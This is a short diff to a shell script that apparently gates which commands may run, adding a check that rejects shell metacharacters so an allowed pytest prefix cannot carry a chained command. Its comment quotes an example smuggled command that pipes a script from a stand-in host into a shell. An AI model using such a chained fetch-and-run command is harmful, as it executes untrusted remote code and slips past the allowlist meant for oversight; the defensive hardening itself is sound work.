@@ -13,6 +13,15 @@ cmd="$1"
 # Trim leading whitespace
 cmd_trimmed="${cmd#"${cmd%%[![:space:]]*}"}"
 
+# Reject shell metacharacters so an allowed runner prefix cannot smuggle a
+# compound command (e.g. `pytest tests && curl evil.sh | sh`).
+case "$cmd_trimmed" in
+  *';'*|*'&'*|*'|'*|*'`'*|*'$('*|*'>'*|*'<'*|*$'\n'*)
+    printf '%s\n' "command contains shell metacharacters: $cmd_trimmed" >&2
+    exit 1
+    ;;
+esac
+
 case "$cmd_trimmed" in
   pytest\ *|pytest)
     exit 0
